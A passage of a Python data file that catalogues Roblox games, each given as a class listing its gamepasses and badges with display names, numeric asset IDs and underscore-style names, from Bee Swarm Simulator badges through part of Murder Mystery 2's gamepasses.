        EggHunt2019                = 'Egg Hunt 2019',                   2124458125, 'Egg_Hunt_2019'
        Million1Honey              = '1 Million Honey',                 1749468648, '1_Million_Honey'
        Million10Honey             = '10 Million Honey',                1749519033, '10_Million_Honey'
        Million100Honey            = '100 Million Honey',               1749523673, '100_Million_Honey'
        Billion1Honey              = '1 Billion Honey',                 1749534539, '1_Billion_Honey'
        Billion20Honey             = '20 Billion Honey',                2124426329, '20_Billion_Honey'
        Thousand500Goo             = '500 Thousand Goo',                1874484250, '500_Thousand_Goo'
        Million5Goo                = '5 Million Goo',                   1874485358, '5_Million_Goo'
        Million50Goo               = '50 Million Goo',                  1874486035, '50_Million_Goo'
        Million500Goo              = '500 Million Goo',                 1874487127, '500_Million_Goo'
        Billion10Goo               = '10 Billion Goo',                  2124426332, '10_Billion_Goo'
        Battle100Points            = '100 Battle Points',               1749564142, '100_Battle_Points'
        Thousand1BattlePoints      = '1 Thousand Battle Points',        1749566481, '1_Thousand_Battle_Points'
        Thousand10BattlePoints     = '10 Thousand Battle Points',       1749568562, '10_Thousand_Battle_Points'
        Thousand50BattlePoints     = '50 Thousand Battle Points',       1749570424, '50_Thousand_Battle_Points'
        Million1BattlePoints       = '1 Million Battle Points',         2124426330, '1_Million_Battle_Points'
        Ability2500Tokens          = '2500 Ability Tokens',             1874442964, '2500_Ability_Tokens'
        Thousand25AbilityTokens    = '25 Thousand Ability Tokens',      1874445609, '25_Thousand_AbilityTokens'
        Thousand100AbilityTokens   = '100 Thousand Ability Tokens',     1874446720, '100_Thousand_AbilityTokens'
        Million1AbilityTokens      = '1 Million Ability Tokens',        1874447816, '1_Million_Ability_Tokens'
        Million10AbilityTokens     = '10 Million Ability Tokens',       2124426331, '10_Million_Ability_Tokens'
        # List Of Badges
        listOfBadges = [YouPlayedBeeSwarmSimulator, SwarmingEggOfTheHive, BeesmasBeeliever, BeesmasOverachiever, EggHunt2019, Million1Honey, Million10Honey, Million100Honey, Billion1Honey, Billion20Honey, Thousand500Goo, Million5Goo, Million50Goo, Million500Goo, Billion10Goo, Battle100Points, Thousand1BattlePoints, Thousand10BattlePoints, Thousand50BattlePoints, Million1BattlePoints, Ability2500Tokens, Thousand25AbilityTokens, Thousand100AbilityTokens, Million1AbilityTokens, Million10AbilityTokens]

class BladeBall: # https://www.roblox.com/games/13772394625
    placeNames = 'Blade Ball', 'Blade_Ball', 'BB', 13772394625
    class Gamepasses:
        VIP         = 'VIP',          223367086, 'VIP'
        DoubleCoins = 'Double Coins', 226785981, 'Double_Coins'
        InstantSpin = 'Instant Spin', 229765926, 'Instant_Spin'
        TradingSign = 'Trading Sign', 895596060, 'Trading_Sign'
        # List Of Gamepasses
        listOfGamepasses = [VIP, DoubleCoins, InstantSpin, TradingSign]

class BloxFruits: # https://www.roblox.com/games/2753915549
    placeNames = 'Blox Fruits', 'Blox_Fruits', 'BF', 2753915549
    class Gamepasses:
        x2Money       = '2x Money',       6028662, '2x_Money'
        DarkBlade     = 'Dark Blade',     6028786, 'Dark_Blade'
        x2Mastery     = '2x Mastery',     6240746, '2x_Mastery'
        FastBoats     = 'Fast Boats',     6525589, 'Fast_Boats'
        FruitNotifier = 'Fruit Notifier', 6738811, 'Fruit_Notifier'
        x2BossDrops   = '2x Boss Drops',  7578721, '2x_Boss_Drops'
        # List Of Gamepasses
        listOfGamepasses = [x2Money, DarkBlade, x2Mastery, FastBoats, FruitNotifier, x2BossDrops]
    class Badges:
        SecondSea     = 'Second Sea', 2125253106, 'Second_Sea'
        ThirdSea      = 'Third Sea',  2125253113, 'Third_Sea'
        # List Of Badges
        listOfBadges = [SecondSea, ThirdSea]

class BlueLockRivals: # https://www.roblox.com/games/18668065416
    placeNames = 'Blue Lock: Rivals', 'Blue_Lock_Rivals', 'BLR', 18668065416
    class Gamepasses:
        VIP                = 'VIP',                 952453152,  'VIP'
        AnimeEmotes        = 'Anime Emotes',        957906237,  'Anime_Emotes'
        ToxicEmotes        = 'Toxic Emotes',        958185291,  'Toxic_Emotes'
        SkipSpins          = 'Skip Spins',          965195377,  'Skip_Spins'
        AwakeningOutfits   = 'Awakening Outfits',   1034038790, 'Awakening_Outfits'
        GoalSound          = 'Goal Sound',          1045871823, 'Goal_Sound'
        AnkleBreakerSound  = 'Ankle Breaker Sound', 1046171023, 'Ankle_Breaker_Sound'
        PrivacyServersPlus = 'Privacy Servers+',    1054209537, 'Privacy_Servers_Plus'
        # List Of Gamepasses
        listOfGamepasses = [VIP, AnimeEmotes, ToxicEmotes, SkipSpins, AwakeningOutfits, GoalSound, AnkleBreakerSound, PrivacyServersPlus]

class CreaturesofSonaria: # https://www.roblox.com/games/5233782396
    placeNames = 'Creatures of Sonaria', 'Creatures_of_Sonaria', 'CoS', 5233782396
    class Gamepasses:
        CorvuraxSpecies = 'Corvurax Species', 216724088, 'Corvurax_Species'
        # List Of Gamepasses
        listOfGamepasses = [CorvuraxSpecies]
    class Badges:
        BetaTester                      = 'Beta Tester',                       2124595590,       'Beta_Tester'
        BetaSupporter                   = 'Beta Supporter',                    2124595592,       'Beta_Supporter'
        Halloween2022                   = 'Halloween 2022',                    2129022315,       'Halloween_2022'
        Halloween2023                   = 'Halloween 2023',                    2153215846,       'Halloween_2023'
        Halloween2024                   = 'Halloween 2024',                    4462319084474111, 'Halloween_2024'
        ChristmasBadge                  = 'Christmas Badge',                   2124660417,       'Christmas_Badge'
        Christmas2022                   = 'Christmas 2022',                    2129936623,       'Christmas_2022'
        Valentines                      = 'Valentines',                        2124686302,       'Valentines'
        Valentines2023                  = 'Valentines 2023',                   2140726547,       'Valentines_2023'
        Valentines2024                  = 'Valentines 2024',                   55658403086320,   'Valentines_2024'
        Easter2023                      = 'Easter 2023',                       2143625119,       'Easter_2023'
        Easter2024                      = 'Easter 2024',                       1734098717984624, 'Easter_2024'
        LandSeaSky2023                  = 'Land Sea Sky 2023',                 2145610041,       'Land_Sea_Sky_2023'
        LandSeaSky2024                  = 'Land Sea Sky 2024',                 2960167874826659, 'Land_Sea_Sky_2024'
        SummerParadise2023              = 'Summer Paradise 2023',              2149100257,       'Summer_Paradise_2023'
        SummerParadise2024              = 'Summer Paradise 2024',              1654242147814853, 'Summer_Paradise_2024'
        Winter2023                      = 'Winter 2023',                       2661459542444321, 'Winter_2023'
        Winter2024                      = 'Winter 2024',                       2998142934210494, 'Winter_2024'
        SpringMeadows2024               = 'Spring Meadows 2024',               1040006371199126, 'Spring_Meadows_2024'
        Disaster2024                    = 'Disaster 2024',                     1888520945881505, 'Disaster_2024'
        Lore2024                        = 'Lore 2024',                         4346068251661631, 'Lore_2024'
        Harvest2024                     = 'Harvest 2024',                      1596996370838262, 'Harvest_2024'
        Amazon2024                      = 'Amazon 2024',                       2291949305789809, 'Amazon_2024'
        July4th2023                     = 'July 4th 2023',                     2148143991,       'July_4th_2023'
        Firework2024                    = 'Firework 2024',                     2566270751122609, 'Firework_2024'
        TwentyOnePilotsEvent            = 'Twenty One Pilots Event',           2124810991,       'Twenty_One_Pilots_Event'
        RecodeEarlyAccess               = 'Recode Early Access',               2147582505,       'Recode_Early_Access'
        RecodeSupporterTitleAndCreature = 'Recode Supporter Title & Creature', 2147584013,       'Recode_Supporter_Title_And_Creature'
        TwinAtlasWinterClash            = 'Twin Atlas Winter Clash',           1964648519335747, 'Twin_Atlas_Winter_Clash'
        # List Of Badges
        listOfBadges = [BetaTester, BetaSupporter, Halloween2022, Halloween2023, Halloween2024, ChristmasBadge, Christmas2022, Valentines, Valentines2023, Valentines2024, Easter2023, Easter2024, LandSeaSky2023, LandSeaSky2024, SummerParadise2023, SummerParadise2024, Winter2023, Winter2024, SpringMeadows2024, Disaster2024, Lore2024, Harvest2024, Amazon2024, July4th2023, Firework2024, TwentyOnePilotsEvent, RecodeEarlyAccess, RecodeSupporterTitleAndCreature, TwinAtlasWinterClash]

class DaHood: # https://www.roblox.com/games/2788229376
    placeNames = 'Da Hood', 'Da_Hood', 'DH', 2788229376
    class Gamepasses:
        AnonymousCalls        = 'Anonymous Calls',   6072006,   'Anonymous_Calls'
        CustomRingtone        = 'Custom Ringtone',   6080836,   'Custom_Ringtone'
        Boombox               = 'Boombox',           6207330,   'Boombox'
        Knife                 = 'Knife',             6217663,   'Knife'
        Bat                   = 'Bat',               6407926,   'Bat'
        AnimationPack         = 'Animation Pack',    6412475,   'Animation_Pack'
        Flashlight            = 'Flashlight',        6673363,   'Flashlight'
        Shovel                = 'Shovel',            6813576,   'Shovel'
        PepperSpray           = 'Pepper Spray',      6966816,   'Pepper_Spray'
        HouseLimitBoost       = 'House Limit Boost', 7130657,   'House_Limit_Boost'
        Mask                  = 'Mask',              103232594, 'Mask'
        CustomCursor          = 'Custom Cursor',     106911810, 'Custom_Cursor'
        AnimationPackPlusPlus = 'Animation Pack++',  106912041, 'Animation_PackPlusPlus'
        HairGlue              = 'Hair Glue',         916795141, 'Hair_Glue'
        # List Of Gamepasses
        listOfGamepasses = [AnonymousCalls, CustomRingtone, Boombox, Knife, Bat, AnimationPack, Flashlight, Shovel, PepperSpray, HouseLimitBoost, Mask, CustomCursor, AnimationPackPlusPlus, HairGlue]

class DragonAdventures: # https://www.roblox.com/games/3475397644
    placeNames = 'Dragon Adventures', 'Dragon_Adventures', 'DA', 3475397644
    class Gamepasses:
        VIP              = 'VIP',               7010034,  'VIP'
        AdvancedBuilding = 'Advanced Building', 7578781,  'Advanced_Building'
        LuckyEgg         = 'Lucky Egg',         8510023,  'Lucky_Egg'
        ResourceHog      = 'Resource Hog',      8510024,  'Resource_Hog'
        BigBackpack      = 'Big Backpack',      8510025,  'Big_Backpack'
        LuckyTrainer     = 'Lucky Trainer',     8510026,  'Lucky_Trainer'
        MultiRiding      = 'Multi-Riding',      9802010,  'Multi_Riding'
        LuckyTailor      = 'Lucky Tailor',      10999031, 'Lucky_Tailor'
        MultiAccessory   = 'Multi-Accessory',   12000312, 'Multi_Accessory'
        # List Of Gamepasses
        listOfGamepasses = [VIP, AdvancedBuilding, LuckyEgg, ResourceHog, BigBackpack, LuckyTrainer, MultiRiding, LuckyTailor, MultiAccessory]
    class Badges:
        MetaDeveloper  = 'Met a Developer!', 2124634392,       'Met_a_Developer'
        Christmas2022  = 'Christmas 2022',   2129850167,       'Christmas_2022'
        Winter2019     = 'Winter 2019',      2124564089,       'Winter_2019'
        Winter2021     = 'Winter 2021',      2124879418,       'Winter_2021'
        Winter2023     = 'Winter 2023',      1724546607470910, 'Winter_2023'
        Winter2024     = 'Winter 2024',      1680929594185010, 'Winter_2024'
        Valentines2020 = 'Valentines 2020',  2124564091,       'Valentines_2020'
        Valentines2022 = 'Valentines 2022',  2124928448,       'Valentines_2022'
        Valentines2023 = 'Valentines 2023',  2140856200,       'Valentines_2023'
        Valentines2024 = 'Valentines 2024',  2897784583321876, 'Valentines_2024'
        Halloween2019  = 'Halloween 2019',   2124564088,       'Halloween_2019'
        Halloween2020  = 'Halloween 2020',   2124622292,       'Halloween_2020'
        Halloween2021  = 'Halloween 2021',   2124843641,       'Halloween_2021'
        Halloween2022  = 'Halloween 2022',   2129053839,       'Halloween_2022'
        Halloween2023  = 'Halloween 2023',   2153596435,       'Halloween_2023'
        Halloween2024  = 'Halloween 2024',   778861698160847,  'Halloween_2024'
        Easter2020     = 'Easter 2020',      2124564092,       'Easter_2020'
        Easter2021     = 'Easter 2021',      2124706777,       'Easter_2021'
        Easter2022     = 'Easter 2022',      2125832921,       'Easter_2022'
        Easter2023     = 'Easter 2023',      2143031781,       'Easter_2023'
        Easter2024     = 'Easter 2024',      3467626479412502, 'Easter_2024'
        Solstice2020   = 'Solstice 2020',    2124564093,       'Solstice_2020'
        Solstice2021   = 'Solstice 2021',    2124583228,       'Solstice_2021'
        Solstice2022   = 'Solstice 2022',    2128140324,       'Solstice_2022'
        Solstice2023   = 'Solstice 2023',    2150313169,       'Solstice_2023'
        Solstice2024   = 'Solstice 2024',    1575651999109337, 'Solstice_2024'
        Galaxy2022     = 'Galaxy 2022',      2126825175,       'Galaxy_2022'
        Galaxy2023     = 'Galaxy 2023',      2147481065,       'Galaxy_2023'
        Galaxy2024     = 'Galaxy 2024',      2412831398413312, 'Galaxy_2024'
        # List Of Badges
        listOfBadges = [MetaDeveloper, Christmas2022, Winter2019, Winter2021, Winter2023, Winter2024, Valentines2020, Valentines2022, Valentines2023, Valentines2024, Halloween2019, Halloween2020, Halloween2021, Halloween2022, Halloween2023, Halloween2024, Easter2020, Easter2021, Easter2022, Easter2023, Easter2024, Solstice2020, Solstice2021, Solstice2022, Solstice2023, Solstice2024, Galaxy2022, Galaxy2023, Galaxy2024]

class Fisch: # https://www.roblox.com/games/16732694052
    placeNames = 'Fisch', 'Fisch', 'F', 16732694052
    class Gamepasses:
        AppraisersLuck    = 'Appraisers Luck',     837341519, 'Appraisers_Luck'
        DoubleXP          = 'Double XP',           837360470, 'Double_XP'
        Supporter         = 'Supporter',           837478377, 'Supporter'
        EmotePack         = 'Emote Pack',          847012516, 'Emote_Pack'
        SellAnywhere      = 'Sell Anywhere',       901839344, 'Sell_Anywhere'
        BobberPack        = 'Bobber Pack',         927437431, 'Bobber_Pack'
        Radio             = 'Radio',               948629114, 'Radio'
        SpawnBoatAnywhere = 'Spawn Boat Anywhere', 986687236, 'Spawn_Boat_Anywhere'
        AppraiseAnywhere  = 'Appraise Anywhere',   986882975, 'Appraise_Anywhere'
        # List Of Gamepasses
        listOfGamepasses = [AppraisersLuck, DoubleXP, Supporter, EmotePack, SellAnywhere, BobberPack, Radio, SpawnBoatAnywhere, AppraiseAnywhere]
    class Badges:
        FirstTimeFischer        = 'First Time Fischer',         3713345851024569, 'First_Time_Fischer'
        SpecialSomeone          = 'Special Someone',            2548603185740666, 'Special_Someone'
        EconomyExpert           = 'Economy Expert',             4227551957813448, 'Economy_Expert'
        RareHunter              = 'Rare Hunter',                398396161277206,  'Rare_Hunter'
        KeepersPupil            = 'Keepers Pupil',              292081433761936,  'Keepers_Pupil'
        AttemptedUpgrade        = 'Attempted Upgrade',          2087500307302023, 'Attempted_Upgrade'
        DivineRelic             = 'Divine Relic',               4469874271658702, 'Divine_Relic'
        Catches50               = '50 Catches',                 3051769055311800, '50_Catches'
        Catches100              = '100 Catches',                980568772269520,  '100_Catches'
        Catches500              = '500 Catches',                2392322242811007, '500_Catches'
        Catches1000             = '1000 Catches',               2121501969748139, '1000_Catches'
        Catches2000             = '2000 Catches',               4043528816128290, '2000_Catches'
        Catches3000             = '3000 Catches',               2237691197864883, '3000_Catches'
        Catches4000             = '4000 Catches',               2586667227808420, '4000_Catches'
        Catches5000             = '5000 Catches',               2440764735271938, '5000_Catches'
        Catches10000            = '10,000 Catches',             1009279661183813, '10000_Catches'
        LavaCaster              = 'Lava Caster',                1708816354589502, 'Lava_Caster'
        ReconExpert             = 'Recon Expert',               3526079295826418, 'Recon_Expert'
        TruePower               = 'True Power',                 163992758707317,  'True_Power'
        ExperiencedTrueBeauty   = 'Experienced True Beauty',    553555175646641,  'Experienced_True_Beauty'
        BestiaryOcean           = 'Bestiary: Ocean',            1045860405568363, 'Bestiary_Ocean'
        BestiaryMoosewood       = 'Bestiary: Moosewood',        3871316346306270, 'Bestiary_Moosewood'
        BestiaryRoslit          = 'Bestiary: Roslit',           225841574756551,  'Bestiary_Roslit'
        BestiarySunstone        = 'Bestiary: Sunstone',         2903347774735091, 'Bestiary_Sunstone'
        BestiaryTerrapin        = 'Bestiary: Terrapin',         2994442057572213, 'Bestiary_Terrapin'
        BestiaryVolcano         = 'Bestiary: Volcano',          4479912445209985, 'Bestiary_Volcano'
        BestiaryVertigo         = 'Bestiary: Vertigo',          3200076862852988, 'Bestiary_Vertigo'
        BestiaryMushgrove       = 'Bestiary: Mushgrove',        4343979385420841, 'Bestiary_Mushgrove'
        BestiarySnowcap         = 'Bestiary: Snowcap',          4101868524305507, 'Bestiary_Snowcap'
        BestiaryEverything      = 'Bestiary: Everything',       635398639427099,  'Bestiary_Everything'
        BestiaryKeepersAltar    = 'Bestiary: Keepers Altar',    772547227400435,  'Bestiary_Keepers_Altar'
        BestiaryDesolateDeep    = 'Bestiary: Desolate Deep',    3161443122784523, 'Bestiary_Desolate_Deep'
        BestiaryBrinePool       = 'Bestiary: Brine Pool',       1535329670769985, 'Bestiary_Brine_Pool'
        BestiaryForsaken        = 'Bestiary: Forsaken',         3591399443042848, 'Bestiary_Forsaken'
        BestiaryDepths          = 'Bestiary: Depths',           2042505003241970, 'Bestiary_Depths'
        BestiaryAncientArchives = 'Bestiary: Ancient Archives', 1666493813690822, 'Bestiary_Ancient_Archives'
        BestiaryAncientIsles    = 'Bestiary: Ancient Isles',    2054807830474099, 'Bestiary_Ancient_Isles'
        BestiaryOvergrowthCaves = 'Bestiary: Overgrowth Caves', 272078520028439,  'Bestiary_Overgrowth_Caves'
        BestiaryFrigidCavern    = 'Bestiary: Frigid Cavern',    843774301770016,  'Bestiary_Frigid_Cavern'
        BestiaryCryogenicCanal  = 'Bestiary: Cryogenic Canal',  4189906956026791, 'Bestiary_Cryogenic_Canal'
        BestiaryGlacialGrotto   = 'Bestiary: Glacial Grotto',   1396071619017862, 'Bestiary_Glacial_Grotto'
        BestiaryGrandReef       = 'Bestiary: Grand Reef',       968483808853747,  'Bestiary_Grand_Reef'
        BestiaryAtlanteanStorm  = 'Bestiary: Atlantean Storm',  32642745294476,   'Bestiary_Atlantean_Storm'
        BestiaryAtlantis        = 'Bestiary: Atlantis',         2070428894950149, 'Bestiary_Atlantis'
        FischFright2024         = 'FISCHFRIGHT 2024',           2594646182778359, 'Fisch_Fright_2024'
        # List Of Badges    
        listOfBadges = [FirstTimeFischer, SpecialSomeone, EconomyExpert, RareHunter, KeepersPupil, AttemptedUpgrade, DivineRelic, Catches50, Catches100, Catches500, Catches1000, Catches2000, Catches3000, Catches4000, Catches5000, Catches10000, LavaCaster, ReconExpert, TruePower, ExperiencedTrueBeauty, BestiaryOcean, BestiaryMoosewood, BestiaryRoslit, BestiarySunstone, BestiaryTerrapin, BestiaryVolcano, BestiaryVertigo, BestiaryMushgrove, BestiarySnowcap, BestiaryEverything, BestiaryKeepersAltar, BestiaryDesolateDeep, BestiaryBrinePool, BestiaryForsaken, BestiaryDepths, BestiaryAncientArchives, BestiaryAncientIsles, BestiaryOvergrowthCaves, BestiaryFrigidCavern, BestiaryCryogenicCanal, BestiaryGlacialGrotto, BestiaryGrandReef, BestiaryAtlanteanStorm, BestiaryAtlantis, FischFright2024]

class FiveNightsTD: # https://www.roblox.com/games/15846919378
    placeNames = 'Five Nights TD', 'Five_Nights_TD', 'FNTD', 15846919378
    class Gamepasses:
        VIP = 'VIP', 755213386, 'VIP', True
        # List Of Gamepasses
        listOfGamepasses = [VIP]
    class Badges:
        JoinTheGame                = 'Join The Game',                  450768915498982,  'Join_The_Game'
        WinaGame                   = 'Win a Game',                     3361299059765,    'Win_a_Game'
        TheARG1                    = 'The ARG 1',                      2308722040924793, 'The_ARG_1'
        ARG2Winner                 = 'ARG 2 Winner',                   4348953112147721, 'ARG_2_Winner'
        CompleteGame1              = 'Complete Game 1',                1801557447657311, 'Complete_Game_1'
        CompleteGame2              = 'Complete Game 2',                660308672766666,  'Complete_Game_2'
        CompleteGame4              = 'Complete Game 4',                1352734224772502, 'Complete_Game_4'
        FinishGame3                = 'Finish Game 3',                  1249525436995984, 'Finish_Game_3'
        CompleteGame5              = 'Complete Game 5',                3840686186033460, 'Complete_Game_5'
        CompleteGame6              = 'Complete Game 6',                1289932523675224, 'Complete_Game_6'
        PlaySummerEvent            = 'Play Summer Event',              4093753784951799, 'Play_Summer_Event'
        CompleteSummerEvent        = 'Complete Summer Event',          4192377969805376, 'Complete_Summer_Event'
        PlayMilitaryEvent          = 'Play Military Event',            3717054685843370, 'Play_Military_Event'
        CompleteMilitaryEvent      = 'Complete Military Event',        1710710467179779, 'Complete_Military_Event'
        PlayWildWestEvent          = 'Play Wild West Event',           78638580451212,   'Play_WildWest_Event'
        FinishWildWest             = 'Finish Wild West',               4427897814216895, 'Finish_Wild_West'
        PlayHalloweenEvent         = 'Play Halloween Event',           481777508062526,  'Play_Halloween_Event'
        CompleteHalloweenEvent     = 'Complete Halloween Event',       314612341496152,  'Complete_Halloween_Event'
        PlayedSteampunkEvent       = 'PlayedSteampunk Event',          2794698248016894, 'Played_Steampunk_Event'
        CompletedSteampunkEvent    = 'Completed Steampunk Event',      4321640724737709, 'Completed_Steampunk_Event'
        PlayedChristmasEvent       = 'Played Christmas Event',         2924114884782147, 'Played_Christmas_Event'
        CompletedChristmasEvent    = 'Completed Christmas Event',      2486341879016297, 'Completed_Christmas_Event'
        ClaimCalenderSpecialReward = 'Claim Calender Special Reward',  3554984265461704, 'Claim_Calender_Special_Reward'
        # List Of Badges
        listOfBadges = [JoinTheGame, WinaGame, TheARG1, ARG2Winner, CompleteGame1, CompleteGame2, CompleteGame4, FinishGame3, CompleteGame5, CompleteGame6, PlaySummerEvent, CompleteSummerEvent, PlayMilitaryEvent, CompleteMilitaryEvent, PlayWildWestEvent, FinishWildWest, PlayHalloweenEvent, CompleteHalloweenEvent, PlayedSteampunkEvent, CompletedSteampunkEvent, PlayedChristmasEvent, CompletedChristmasEvent, ClaimCalenderSpecialReward]

class GrandPieceOnline: # https://www.roblox.com/games/1730877806
    placeNames = 'Grand Piece Online', 'Grand_Piece_Online', 'GPO', 1730877806
    class Gamepasses:
        EmotePack1          = 'Emote Pack #1',         5233790,    'Emote_Pack_1'
        EmotePack2          = 'Emote Pack #2',         6360299,    'Emote_Pack_2'
        EmotePack3          = 'Emote Pack #3',         9247442,    'Emote_Pack_3'
        x2_Bank_Storage     = '2x Bank Storage',       9846094,    '2x_Bank_Storage'
        DevilFruitNotifier  = 'Devil Fruit Notifier',  10535601,   'Devil_Fruit_Notifier'
        FruitBag            = 'Fruit Bag',             12776768,   'Fruit_Bag'
        Striker             = 'Striker',               12146732,   'Striker'
        CoffinBoat          = 'Coffin Boat',           10897748,   'Coffin_Boat'
        FacePack1           = 'Face Pack #1',          11023931,   'Face_Pack_1'
        PrivacyServers      = 'Privacy Servers',       12769541,   'Privacy_Servers'
        MemeEmotes          = 'Meme Emotes',           13465428,   'Meme_Emotes'
        MarineEmotes        = 'Marine Emotes',         13465435,   'Marine_Emotes'
        JojoEmotes          = 'Jojo Emotes',           13465461,   'Jojo_Emotes'
        MusicSnail          = 'Music Snail',           13467111,   'Music_Snail'
        DrippyFit           = 'Drippy Fit',            14337840,   'Drippy_Fit'
        DungeonMapChooser   = 'Dungeon Map Chooser',   24351992,   'Dungeon_Map_Chooser'
        FastAutoRaceReroll  = 'Fast Auto Race Reroll', 843435230,  'Fast_Auto_Race_Reroll'
        Season1Battlepass   = 'Season 1 Battlepass',   99823291,   'Season_1_Battlepass'
        Season2Battlepass   = 'Season 2 Battlepass',   114432469,  'Season_2_Battlepass'
        BP                  = 'BP',                    659418065,  'BP'
        ChristmasBattlepass = 'Christmas Battlepass',  676823798,  'Christmas_Battlepass'
        Season5BP           = 'Season 5 BP',           867616837,  'Season_5_BP'
        Season6BP           = 'Season 6 BP',           1010918687, 'Season_6_BP'
        # List Of Gamepasses
        listOfGamepasses = [EmotePack1, EmotePack2, EmotePack3, x2_Bank_Storage, DevilFruitNotifier, FruitBag, Striker, CoffinBoat, FacePack1, PrivacyServers, MemeEmotes, MarineEmotes, JojoEmotes, MusicSnail, DrippyFit, DungeonMapChooser, FastAutoRaceReroll, Season1Battlepass, Season2Battlepass, BP, ChristmasBattlepass, Season5BP, Season6BP]
    class Badges:
        early           = 'early',             2124538094, 'early'
        PaidAccessToken = 'Paid Access Token', 2124636610, 'Paid_Access_Token'
        CertifiedTrader = 'Certified Trader',  2124828978, 'Certified_Trader'
        ANewAdventure   = 'A New Adventure',   2127154256, 'A_New_Adventure'
        phoeyugate      = 'phoeyu gate',       2127585705, 'phoeyu_gate'
        # List Of Badges
        listOfBadges = [early, PaidAccessToken, CertifiedTrader, ANewAdventure, phoeyugate]

class JailBreak: # https://www.roblox.com/games/606849621
    placeNames = 'Jail Break', 'Jail_Break', 'JB', 606849621
    class Gamepasses:
        ExtraStorage = 'Extra Storage',               2068240,  'Extra_Storage'
        SWATTeam     = 'SWAT Team',                   2070427,  'SWAT_Team'
        CarStereo    = 'Car Stereo',                  2218187,  'Car_Stereo'
        DuffelBag    = 'Duffel Bag',                  2219040,  'Duffel_Bag'
        VIP          = 'VIP (Very Important Player)', 2296901,  'VIP_Very_Important_Player'
        ProGarage    = 'Pro Garage',                  2725211,  'Pro_Garage'
        CrimeBoss    = 'Crime Boss',                  4974038,  'Crime_Boss'
        XPBoost      = 'XP Boost',                    6631507,  'XP_Boost'
        VIPTrading   = 'VIP Trading',                 56149618, 'VIP_Trading'
        # List Of Gamepasses
        listOfGamepasses = [ExtraStorage, SWATTeam, CarStereo, DuffelBag, VIP, ProGarage, CrimeBoss, XPBoost, VIPTrading]
    class Badges:
        MVP                                 = 'MVP (Most Valuable Player)',              958186367,  'MVP_Most_Valuable_Player'
        BankBust                            = 'Bank Bust',                               958186941,  'Bank_Bust'
        DrillSergeant                       = 'Drill Sergeant',                          958187053,  'Drill_Sergeant'
        MasterCriminal                      = 'Master Criminal',                         958187226,  'Master_Criminal'
        BonnieAndClyde                      = 'Bonnie & Clyde',                          958187343,  'Bonnie_And_Clyde'
        SmoothCriminal                      = 'Smooth Criminal',                         958187470,  'Smooth_Criminal'
        MeetTheDevs                         = 'Meet The Devs!',                          1399506017, 'Meet_The_Devs'
        Unnamed1                            = '??? 1',                                   2124575784, 'Unnamed_1'
        JailbreakRBBattlesChampionshipBadge = 'Jailbreak RB Battles Championship Badge', 2124624990, 'Jailbreak_RB_Battles_Championship_Badge'
        Unnamed2                            = '??? 2',                                   2129465542, 'Unnamed_2'
        DefeatTheCEO                        = 'Defeat The CEO!',                         2129891386, 'Defeat_The_CEO'
        # List Of Badges
        listOfBadges = [MVP, BankBust, DrillSergeant, MasterCriminal, BonnieAndClyde, SmoothCriminal, MeetTheDevs, Unnamed1, JailbreakRBBattlesChampionshipBadge, Unnamed2, DefeatTheCEO]

class JujutsuInfinite: # https://www.roblox.com/games/10450270085
    placeNames = 'Jujutsu Infinite', 'Jujutsu_Infinite', 'JI', 10450270085
    class Gamepasses:
        InnateSlot3         = 'Innate Slot 3',        77102481,  'Innate_Slot_3'
        InnateSlot4         = 'Innate Slot 4',        77102528,  'Innate_Slot_4'
        HeavenlyRestriction = 'Heavenly Restriction', 77102969,  'Heavenly_Restriction'
        ExtraEmoteSlots     = 'Extra Emote Slots',    77103194,  'Extra_Emote_Slots'
        ItemNotifier        = 'Item Notifier',        77103458,  'Item_Notifier'
        InnateBag           = 'Innate Bag',           77110710,  'Innate_Bag'
        SkipSpins           = 'Skip Spins',           259500454, 'Skip_Spins'
        # List Of Gamepasses
        listOfGamepasses = [InnateSlot3, InnateSlot4, HeavenlyRestriction, ExtraEmoteSlots, ItemNotifier, InnateBag, SkipSpins]
    class Badges:
        PlayedJujutsuInfinite = 'Played Jujutsu Infinite', 2136221767,       'Played_Jujutsu_Infinite'
        DomainExpansion       = 'Domain Expansion',        2136222659,       'Domain_Expansion'
        SpecialGradeSorcerer  = 'Special Grade Sorcerer',  2136224010,       'Special_Grade_Sorcerer'
        PlayedTutorial        = 'Played Tutorial',         1768126716824041, 'Played_Tutorial'
        # List Of Badges
        listOfBadges = [PlayedJujutsuInfinite, DomainExpansion, SpecialGradeSorcerer, PlayedTutorial]

class KingLegacy: # https://www.roblox.com/games/4520749081
    placeNames = 'King Legacy', 'King_Legacy', 'KL', 4520749081
    class Gamepasses:
        Tips              = 'Tips',                7866886,  'Tips'
        QuestExperiencex2 = 'Quest Experience x2', 7888149,  'Quest_Experience_x2'
        NightBlade        = 'Night Blade',         7929804,  'Night_Blade'
        FruitPosition     = 'Fruit Position',      7936106,  'Fruit_Position'
        QuestMoneyx2      = 'Quest Money x2',      8114853,  'Quest_Money_x2'
        ConquerorAbility  = 'Conqueror Ability',   8287391,  'Conqueror_Ability'
        CoffinBoat        = 'Coffin Boat',         9876237,  'Coffin_Boat'
        ItemDropx2        = 'Item Drop x2',        18044132, 'Item_Drop_x2'
        LegacyPose        = 'Legacy Pose',         18399361, 'Legacy_Pose'
        FruitBag          = 'Fruit Bag',           23746192, 'Fruit_Bag'
        # List Of Gamepasses
        listOfGamepasses = [Tips, QuestExperiencex2, NightBlade, FruitPosition, QuestMoneyx2, ConquerorAbility, CoffinBoat, ItemDropx2, LegacyPose, FruitBag]
    class Badges:
        SecondSea = 'Second Sea', 570761085363018,  'Second_Sea'
        ThirdSea  = 'Third Sea',  2677309180656288, 'Third_Sea'
        # List Of Badges
        listOfBadges = [SecondSea, ThirdSea]

class MurderMystery2: # https://www.roblox.com/games/142823291
    placeNames = 'Murder Mystery 2', 'Murder_Mystery_2', 'MM2', 142823291
    class Gamepasses:
        Elite                    = 'Elite',                                   429957 ,    'Elite'
        Radio                    = 'Radio',                                   1308795,    'Radio'
        RandomizedFaces1         = 'Randomized Faces 1',                      79442,      'Randomized_Faces_1'
        RandomizedFaces2         = 'Randomized Faces 2',                      429356,     'Randomized_Faces_2'
        ShadowItemPack           = 'Shadow Item Pack',                        1201672,    'Shadow_Item_Pack'
        ClockworkItemPack        = 'Clockwork Item Pack ',                    1491260,    'Clockwork_Item_Pack'
        BIT8ItemPack             = '8-BIT Item Pack',                         1531578,    '8_BIT_Item_Pack'
        FuturisticItemPack       = 'Futuristic Item Pack',                    1712843,    'Futuristic_Item_Pack'
        AmericanItemPack         = 'American Item Pack',                      2002511,    'American_Item_Pack'
        HalloweenItemPack        = 'Halloween Item Pack',                     3346253,    'Halloween_Item_Pack'
